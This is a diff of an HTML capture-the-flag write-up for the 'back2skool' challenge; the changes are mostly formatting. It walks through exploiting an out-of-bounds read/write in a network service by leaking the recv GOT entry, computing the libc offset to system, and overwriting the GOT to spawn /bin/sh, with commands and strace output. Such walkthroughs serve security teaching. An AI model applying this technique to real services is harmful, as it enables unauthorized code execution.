@@ -107,18 +107,16 @@
 <section id="hello-binary" class="level1">
 <h1>Hello binary!</h1>
 <p>Let’s start by inspecting the binary.</p>
-<ul>
-<li><p>32bit dynamically linked binary</p>
+<p>It is a 32bit dynamically linked binary</p>
 <pre><code>$ file ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f: ELF 32-bit LSB executable, ...</code></pre></li>
-<li><p>it waits for connections on port 31337</p>
+./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f: ELF 32-bit LSB executable, ...</code></pre>
+<p>Which waits for connections on port 31337</p>
 <pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
 	[...]
 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
 bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
 listen(3, 20)                           = 0
-accept(3, </code></pre></li>
-</ul>
+accept(3,</code></pre>
 <p><code>SO_REUSEADDR</code> is used, just for <em>easy</em> debugging ;-) - it allows other sockets to <code>bind()</code> this port; no more getting the annoying error <em>Address already in use</em> after the server crashes.</p>
 <pre><code>$ telnet localhost 31337
 Trying ::1...
@@ -354,51 +352,51 @@ Program terminated with signal 11, Segmentation fault.
 $ </code></pre>
 <p>Hmm, nothing useful, nothing to execute, nothing to modify the mappings. But hey, if you have access to those functions from libc and because the loader maps the libc to our address space then it means that we have access to other functions from libc, the problem is that we don’t know where they are. A wild <strong>idea appears</strong>, if we knew where one of the function from libc is, we can compute the rest of them by adding some offsets. There are two problems with this idea: <strong>how do we find the offset of a used function</strong> and <strong>how do we compute the offset of an unused function</strong>.</p>
 <ul>
-<li><p>finding the address of a used function is <strong>simple</strong>, we can use the GOT and read the value of the pointer which has been already filled in by the loader. Because of the lazy linking, we only have to be careful to choose a function which has been previously called. We will choose <code>recv</code> for this purpose.</p>
-<pre><code>$ objdump -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  | grep -A2 recv@plt
-08048980 &lt;recv@plt&gt;:
- 8048980:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</code></pre></li>
+<li>finding the address of a used function is <strong>simple</strong>, we can use the GOT and read the value of the pointer which has been already filled in by the loader. Because of the lazy linking, we only have to be careful to choose a function which has been previously called. We will choose <code>recv</code> for this purpose.</li>
 </ul>
+<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">objdump</span> -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  <span class="kw">|</span> <span class="kw">grep</span> -A2 recv@plt
+<span class="kw">08048980</span> <span class="kw">&lt;</span>recv@plt<span class="kw">&gt;</span>:
+ <span class="kw">8048980</span>:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</code></pre>
 <p><strong>0x804bfc0</strong> is the GOT entry for <code>recv</code> function.</p>
 <ul>
-<li><p>finding the relative offset of the function that we want to jump to (e.g. <code>system</code>) is <strong>difficult</strong>. This offset depends on the version of libc that is used on the target system. To make things simple, we will focus first on exploiting locally - meaning that we have access to our libc file. To compute the offset we only have to find the function entries in libc.</p>
-<pre><code>$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' recv@'
-  1124: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
-$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' system@'
-  1398: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
-$ echo $((0x00039100-0x000cebf0))
--613104</code></pre></li>
+<li>finding the relative offset of the function that we want to jump to (e.g. <code>system</code>) is <strong>difficult</strong>. This offset depends on the version of libc that is used on the target system. To make things simple, we will focus first on exploiting locally - meaning that we have access to our libc file. To compute the offset we only have to find the function entries in libc.</li>
 </ul>
+<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="kw">grep</span> <span class="st">' recv@'</span>
+  <span class="kw">1124</span>: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
+$ <span class="kw">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="kw">grep</span> <span class="st">' system@'</span>
+  <span class="kw">1398</span>: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+$ <span class="kw">echo</span> <span class="ot">$((</span>0x00039100-0x000cebf0<span class="ot">))</span>
+<span class="kw">-613104</span></code></pre>
 <p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. <code>address_of_recv_function+OFFSET</code>.</p>
-<pre><code>$ telnet localhost 31337
-read
-Input position to read from:
--32
-Value at position -32: -1217696784
-write
-Input position to write to:
--2147483634
-Input numeric value to write:
--1218309888
-Value at position -2147483634: -1218309888
-math
-Result of math: -1</code></pre>
-<p>Reading from <strong>-32</strong> it’s equivalent of reading -32*4 bytes before our buffer. 0x804c040-32*4 is 0x804bfc0, this is the <code>recv</code> GOT entry. <strong>-1218309888</strong> is -1217696784-613104.</p>
+<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">telnet</span> localhost 31337
+<span class="kw">read</span>
+<span class="kw">Input</span> position to read from:
+<span class="kw">-32</span>
+<span class="kw">Value</span> at position -32: -1217696784
+<span class="kw">write</span>
+<span class="kw">Input</span> position to write to:
+<span class="kw">-2147483634</span>
+<span class="kw">Input</span> numeric value to write:
+<span class="kw">-1218309888</span>
+<span class="kw">Value</span> at position -2147483634: -1218309888
+<span class="kw">math</span>
+<span class="kw">Result</span> of math: -1</code></pre>
+<p>Reading from <code>-32</code> it’s equivalent of reading <code>-32*4</code> bytes before our buffer. <code>0x804c040-32*4</code> is <code>0x804bfc0</code>, this is the <code>recv</code> GOT entry. <code>-1218309888</code> is <code>-1217696784-613104</code>.</p>
 <p>Hey, it didn’t crashed, that’s a plus! Meanwhile, back at the castle.</p>
-<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-[...]
-[pid  4901] send(4, &quot;Value at position -2147483634: -&quot;..., 43, 0) = 43
-[pid  4901] read(4, &quot;m&quot;, 1)             = 1
-[pid  4901] read(4, &quot;a&quot;, 1)             = 1
-[pid  4901] read(4, &quot;t&quot;, 1)             = 1
-[pid  4901] read(4, &quot;h&quot;, 1)             = 1
-[pid  4901] read(4, &quot;\r&quot;, 1)            = 1
-[pid  4901] read(4, &quot;\n&quot;, 1)            = 1
-[...]
-[pid  4902] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;], [/* 31 vars */]) = 0
-[pid  4902] brk(0)                      = 0x9a04000
-[...]</code></pre>
-<p>We successfully <strong>called execve</strong>!</p>
+<pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">strace</span> -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
+[<span class="kw">...</span>]
+[<span class="kw">pid</span>  4901] send(4, <span class="st">&quot;Value at position -2147483634: -&quot;</span>..., 43, 0) = <span class="kw">43</span>
+[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;m&quot;</span>, 1)             = <span class="kw">1</span>
+[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;a&quot;</span>, 1)             = <span class="kw">1</span>
+[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;t&quot;</span>, 1)             = <span class="kw">1</span>
+[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;h&quot;</span>, 1)             = <span class="kw">1</span>
+[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;\r&quot;</span>, 1)            = <span class="kw">1</span>
+[<span class="kw">pid</span>  4901] read(4, <span class="st">&quot;\n&quot;</span>, 1)            = <span class="kw">1</span>
+[<span class="kw">...</span>]
+[<span class="kw">pid</span>  4902] execve(<span class="st">&quot;/bin/sh&quot;</span>, [<span class="st">&quot;sh&quot;</span>, <span class="st">&quot;-c&quot;</span>, <span class="st">&quot;&quot;</span>], [/* 31 vars */]) = <span class="kw">0</span>
+[<span class="kw">pid</span>  4902] brk(0)                      = <span class="kw">0x9a04000</span>
+[<span class="kw">...</span>]</code></pre>
+<p>We successfully <strong>called <code>execve</code></strong>!</p>
 </section>
 <section id="parameters-to-execve" class="level2">
 <h2>Parameters to execve</h2>
